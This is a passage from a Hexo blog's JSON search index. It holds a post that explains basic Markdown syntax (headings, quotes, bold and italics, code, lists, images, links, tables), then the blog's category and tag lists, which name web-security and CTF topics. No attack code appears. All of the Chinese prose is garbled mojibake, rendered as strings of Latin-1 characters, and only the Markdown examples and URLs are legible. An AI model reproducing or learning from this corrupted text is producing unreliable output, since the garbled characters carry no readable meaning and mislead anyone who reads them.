-html","slug":"webå‰ç«¯-html","permalink":"http://example.com/tags/web%E5%89%8D%E7%AB%AF-html/"}]},{"title":"å…³äºæ–°æ‰‹å†™åšå®¢æ—¶çš„å¸¸ç”¨mdè¯­æ³•","slug":"å…³äºæ–°æ‰‹å†™åšå®¢æ—¶çš„å¸¸ç”¨mdè¯­æ³•","date":"2021-09-20T14:23:26.000Z","updated":"2021-09-22T13:29:37.868Z","comments":true,"path":"2021/09/20/å…³äºæ–°æ‰‹å†™åšå®¢æ—¶çš„å¸¸ç”¨mdè¯­æ³•/","link":"","permalink":"http://example.com/2021/09/20/%E5%85%B3%E4%BA%8E%E6%96%B0%E6%89%8B%E5%86%99%E5%8D%9A%E5%AE%A2%E6%97%B6%E7%9A%84%E5%B8%B8%E7%94%A8md%E8%AF%AD%E6%B3%95/","excerpt":"å‰è¨€ï¼šå½“æˆ‘ä»¬æ­å»ºå®Œgithub+hexoçš„åšå®¢è¿›å…¥å®éªŒå®¤åï¼Œæˆ‘ä»¬æ‰€è¦é¢å¯¹çš„ç¬¬ä¸€ä¸ªé—®é¢˜ä¾¿æ˜¯å¦‚ä½•ç”¨markdownè¯­æ³•å†™ä¸‹è‡ªå·±çš„ç¬¬ä¸€ç¯‡åšå®¢ã€‚æˆ‘åœ¨é˜…è¯»å­¦ä¹ markdownè¯­æ³•ä¸ä¸€äº›ç½‘ä¸Šæ•™ç¨‹è¯´æ˜åï¼Œæ€»ç»“äº†ä¸€äº›å¸¸ç”¨markdownè¯­æ³•ä¾›å‚è€ƒã€‚ ä¸€ã€å…³äºæ ‡é¢˜","text":"å‰è¨€ï¼šå½“æˆ‘ä»¬æ­å»ºå®Œgithub+hexoçš„åšå®¢è¿›å…¥å®éªŒå®¤åï¼Œæˆ‘ä»¬æ‰€è¦é¢å¯¹çš„ç¬¬ä¸€ä¸ªé—®é¢˜ä¾¿æ˜¯å¦‚ä½•ç”¨markdownè¯­æ³•å†™ä¸‹è‡ªå·±çš„ç¬¬ä¸€ç¯‡åšå®¢ã€‚æˆ‘åœ¨é˜…è¯»å­¦ä¹ markdownè¯­æ³•ä¸ä¸€äº›ç½‘ä¸Šæ•™ç¨‹è¯´æ˜åï¼Œæ€»ç»“äº†ä¸€äº›å¸¸ç”¨markdownè¯­æ³•ä¾›å‚è€ƒã€‚ ä¸€ã€å…³äºæ ‡é¢˜ å½“æˆ‘ä»¬éœ€è¦åœ¨markdownç¼–è¾‘å™¨ä¸­åŠ å…¥å¦‚ä¸Šï¼ˆä¸€ã€å…³äºæ ‡é¢˜ï¼‰çš„å¤§æ ‡é¢˜æ—¶ï¼Œåªéœ€è¦åœ¨æ ‡é¢˜æ–‡å­—å‰åŠ ä¸Šâ€œ#â€å­—é”®å¹¶ç©ºæ ¼ã€‚æ–‡å­—å‰æœ€å¤šå¯ä»¥åŠ ä¸Š6ä¸ªâ€œ#â€é”®ï¼Œæ¯åŠ å…¥ä¸€ä¸ªâ€œ#â€é”®ï¼Œæ ‡é¢˜å­—å·å°±ä¼šå°ä¸€å·ï¼Œä»£ç å¦‚ä¸‹ï¼š# Title 6ç§æ ‡é¢˜æ•ˆæœå±•ç¤ºï¼š TitleTitleTitleTitleTitleTitleäºŒã€å…³äºå¼•ç”¨å½“æˆ‘ä»¬éœ€è¦å¯¹èµ„æ–™è¿›è¡Œå¼•ç”¨æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å¼•ç”¨èµ„æ–™å‰åŠ å…¥â€œ&lt;â€œé”®è¡¨ç¤ºå¯¹æ–‡å­—è¿›è¡Œå¼•ç”¨ï¼Œå½“ç„¶å¼•ç”¨ä¸­åŒæ ·å¯ä»¥ç»§ç»­å¼•ç”¨ï¼Œäº‹å®ä¸Šï¼Œå¼•ç”¨ä¸­çš„æ–‡å­—åŒæ ·æ”¯æŒmdè¯­æ³•ã€‚ä¸‹æ–¹ä»£ç ä¸¾ä¾‹ï¼š&gt;word&gt;&gt;word ä¸‰ã€å…³äºæ–‡å­—åœ¨markdownè¯­æ³•ä¸­åŒæ ·æœ‰å­—ä½“åŠ ç²—ï¼Œå€¾æ–œç­‰æ•ˆæœï¼Œä¸‹æ–¹ç›´æ¥å±•ç¤ºå‡ ç§å¸¸ç”¨çš„å­—ä½“æ•ˆæœï¼š###1.æ–œä½“*word*word ###2.åŠ ç²—**word**word ###3.æ–œä½“åŠ ç²—***word***word æ³¨æ„ï¼š ç”±äºä¼šå’Œé“¾æ¥çš„é»˜è®¤æ ·å¼äº§ç”Ÿæ··æ·†ï¼Œmarkdownè¯­æ³•ä¸­æ— æ³•ç›´æ¥ä¸ºæ–‡å­—æ·»åŠ ä¸‹åˆ’çº¿ï¼Œå¿…é¡»ä½¿ç”¨è¡Œå†…htmlè§£å†³è¯¥é—®é¢˜ã€‚ éœ€è¦æ¢è¡Œæ—¶éœ€è¦åœ¨æ–‡å­—ä¹‹é—´ç©ºä¸€è¡Œã€‚ å¦‚æœéœ€è¦åˆ†å‰²çº¿åˆ™åœ¨ä¸€ä¸ªç©ºè¡Œä¸­è¾“å…¥ä¸‰ä¸ªæˆ–ä»¥ä¸Šçš„â€œâ€”â€æˆ–â€œ***â€ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š å››ã€æ’å…¥ä»£ç å¦‚æœä½ æƒ³åœ¨ä½ çš„åšå®¢ä¸­ç¼–è¾‘ä¸€æ®µå¦‚ä¸Šæ–‡çš„ä»£ç è¡Œï¼Œåˆ©ç”¨å¥½â€œ`â€å­—ç¬¦ï¼Œä¸¾ä¾‹å¦‚ä¸‹ï¼šå¦‚æœä»…è¾“å…¥ä¸€è¡Œä»£ç ï¼Œåœ¨ä»£ç å·¦å³ä¸¤è¾¹å†™ä¸Šä¸€ä¸ªåå¼•å·ï¼š å¦‚æœæƒ³è¦è¾“å…¥ä»£ç å—çš„è¯ï¼Œåœ¨ä»£ç å—çš„ä¸Šä¸€è¡Œä¸ä¸‹ä¸€è¡Œå†™ä¸Šä¸‰ä¸ªåå¼•å·ï¼š äº”ã€æ’å…¥åˆ—è¡¨å¦‚æœæƒ³åœ¨è‡ªå·±çš„æ–‡å­—å‰åŠ å…¥ä¸€ä¸ªåŠ ç²—é»‘ç‚¹ï¼Œå³æ— åºåˆ—è¡¨ï¼ˆå¦‚ä¸‹ï¼‰ ä¾‹åˆ™åªéœ€è¦åœ¨ä½ çš„æ–‡å­—ä¹‹å‰åŠ å…¥â€œ*â€é”®ï¼Œâ€œ+â€é”®æˆ–â€œ-â€é”®å¹¶ç©ºæ ¼ï¼Œä¾‹å¦‚ï¼š* 123+ 123- 123å¦‚æœéœ€è¦ä¸€ä¸ªæœ‰åºåˆ—è¡¨ï¼Œåˆ™åœ¨æ–‡å­—å‰ä¾æ¬¡è¾“å…¥â€œ1. â€â€œ2. â€ç­‰ï¼Œä¾‹å¦‚ï¼š1. a2. b3. c a b c å…­ã€æ’å…¥å›¾ç‰‡åœ¨å†™åšå®¢æ—¶ï¼Œåˆ©ç”¨å›¾ç‰‡è¿›è¡Œè¯´æ˜çš„ç¯èŠ‚æ˜¯å¿…ä¸å¯å°‘çš„ã€‚åœ¨markdownè¯­æ³•ä¸­ï¼Œæ’å…¥å›¾ç‰‡çš„æ ¼å¼ä¸ºï¼š![alt](å›¾ç‰‡åœ°å€ &quot;title&quot;)å…¶ä¸­altæ˜¯åœ¨å›¾ç‰‡ä¸‹æ–¹åŠ å…¥çš„æ–‡å­—æ³¨é‡Šï¼Œå›¾ç‰‡åœ°å€æŒ‡çš„æ˜¯å›¾ç‰‡åœ¨ç½‘ç»œä¸Šçš„åœ°å€ï¼Œå› æ­¤æ¨èä½¿ç”¨å›¾åºŠä¸Šä¼ ç…§ç‰‡ã€‚è€Œtitleæ˜¯å›¾ç‰‡çš„æ ‡é¢˜ï¼Œè¿™éƒ¨åˆ†å¯çœç•¥ã€‚ä¾‹å¦‚ä¸Šæ–‡â€œæ’å…¥ä»£ç â€ä¸­çš„å›¾ç‰‡è¯­æ³•å¦‚ä¸‹ï¼š![ä¾‹1](http://a1.qpic.cn/psc?/V11wVkh94am2Ju/05RlWl8gsTOH*Z17MtCBzHtFtpA*CeMm5FipmaRi.dnX*JxpHe14OqWyfguXnCP3JwMhlxlKCVqeswVw7*6gPA!!/c&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=XQAiAF0AIgARADc!&amp;tl=1&amp;tm=1632150000&amp;sce=0-12-12&amp;rf=0-18.jpg) ä¸ƒã€æ’å…¥å¤–é“¾å¤–é“¾å³è¶…é“¾æ¥ï¼Œè¯­æ³•å½¢å¼ä¸æ’å…¥å›¾ç‰‡è¾ƒä¸ºç›¸ä¼¼ï¼š[name](é“¾æ¥åœ°å€ &quot;title&quot;)å…¶ä¸­çš„nameæŒ‡è¶…é“¾æ¥çš„æ˜¾ç¤ºåç§°ï¼Œé“¾æ¥åœ°å€å³ä¸ºç½‘å€åŸŸåï¼Œè€ŒåŒæ ·titleæŒ‡çš„è¶…é“¾æ¥æ ‡é¢˜ï¼Œå¯å†™å¯ä¸å†™ï¼Œä¾‹å¦‚ï¼š[ç™¾åº¦](www.baidu.com)ç™¾åº¦ å…«ã€æ’å…¥è¡¨æ ¼æœ€åè¦ä»‹ç»çš„æ˜¯è¡¨æ ¼ï¼Œè¡¨æ ¼åœ¨ä¸€äº›æƒ…å†µä¸‹ä¹Ÿæ˜¯ä¸å¯æˆ–ç¼ºçš„ã€‚åœ¨markdownè¯­æ³•ä¸­ï¼Œä½¿ç”¨â€œ|â€æ¥åˆ†éš”ä¸åŒçš„å•å…ƒæ ¼ï¼Œä½¿ç”¨â€œ-â€æ¥åˆ†éš”è¡¨å¤´å’Œå…¶ä»–è¡Œï¼Œæ ¼å¼å¦‚ä¸‹ï¼š 123|è¡¨å¤´|è¡¨å¤´|è¡¨å¤´||---|---|---||æ–‡å­—|æ–‡å­—|æ–‡å­—| è¡¨å¤´ è¡¨å¤´ è¡¨å¤´ æ–‡å­— æ–‡å­— æ–‡å­— å°ç»“ä»¥ä¸Šä¾¿æ˜¯æˆ‘æ•´ç†çš„å…³äºä½¿ç”¨mdè¯­æ³•ç¼–å†™æ—¶çš„å¸¸ç”¨è¯­æ³•å†…å®¹ï¼ŒåŒæ—¶è¿™ä¹Ÿæ˜¯æˆ‘ç¬¬ä¸€æ¬¡ä½¿ç”¨mdè¯­æ³•è¿›è¡Œæ–‡æœ¬ç¼–è¾‘ï¼Œå¸Œæœ›ä»Šåæˆ‘ä»¬èƒ½ç†Ÿç»ƒæŒæ¡æ›´æ·±å±‚æ¬¡çš„mdè¯­æ³•ï¼Œè®©è‡ªå·±çš„å†™åšå®¢èƒ½åŠ›æ›´ä¸Šä¸€å±‚æ¥¼ã€‚","categories":[{"name":"other","slug":"other","permalink":"http://example.com/categories/other/"}],"tags":[{"name":"-markdown -hexo","slug":"markdown-hexo","permalink":"http://example.com/tags/markdown-hexo/"}]}],"categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"},{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"},{"name":"other","slug":"other","permalink":"http://example.com/categories/other/"}],"tags":[{"name":"-js -web","slug":"js-web","permalink":"http://example.com/tags/js-web/"},{"name":"-ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"-http -web","slug":"http-web","permalink":"http://example.com/tags/http-web/"},{"name":"-web -sqlite","slug":"web-sqlite","permalink":"http://example.com/tags/web-sqlite/"},{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"},{"name":"-write up -ctf -web","slug":"write-up-ctf-web","permalink":"http://example.com/tags/write-up-ctf-web/"},{"name":"-web -php","slug":"web-php","permalink":"http://example.com/tags/web-php/"},{"name":"-ctf -web","slug":"ctf-web","permalink":"http://example.com/tags/ctf-web/"},{"name":"-web -shell","slug":"web-shell","permalink":"http://example.com/tags/web-shell/"},{"name":"-webshell -web","slug":"webshell-web","permalink":"http://example.com/tags/webshell-web/"},{"name":"-web -nmap -ssi","slug":"web-nmap-ssi","permalink":"http://example.com/tags/web-nmap-ssi/"},{"name":"-web -XXE","slug":"web-XXE","permalink":"http://example.com/tags/web-XXE/"},{"name":"-web -ssrf","slug":"web-ssrf","permalink":"http://example.com/tags/web-ssrf/"},{"name":"-web -ssti","slug":"web-ssti","permalink":"http://example.com/tags/web-ssti/"},{"name":"-web","slug":"web","permalink":"http://example.com/tags/web/"},{"name":"-python","slug":"python","permalink":"http://example.com/tags/python/"},{"name":"-MD5 -web","slug":"MD5-web","permalink":"http://example.com/tags/MD5-web/"},{"name":"-web -XSS","slug":"web-XSS","permalink":"http://example.com/tags/web-XSS/"},{"name":"-web -CSRF","slug":"web-CSRF","permalink":"http://example.com/tags/web-CSRF/"},{"name":"-web -DVWA","slug":"web-DVWA","permalink":"http://example.com/tags/web-DVWA/"},{"name":"-web -sql","slug":"web-sql","permalink":"http://example.com/tags/web-sql/"},{"name":"-ctf -misc","slug":"ctf-misc","permalink":"http://example.com/tags/ctf-misc/"},{"name":"-web -mysql -python","slug":"web-mysql-python","permalink":"http://example.com/tags/web-mysql-python/"},{"name":"-web -mysql","slug":"web-mysql","permalink":"http://example.com/tags/web-mysql/"},{"name":"-ç¼–ç ","slug":"ç¼–ç ","permalink":"http://example.com/tags/%E7%BC%96%E7%A0%81/"},{"name":"-webå‰ç«¯ -html","slug":"webå‰ç«¯-html","permalink":"http://example.com/tags/web%E5%89%8D%E7%AB%AF-html/"},{"name":"-markdown -hexo","slug":"markdown-hexo","permalink":"http://example.com/tags/markdown-hexo/"}]}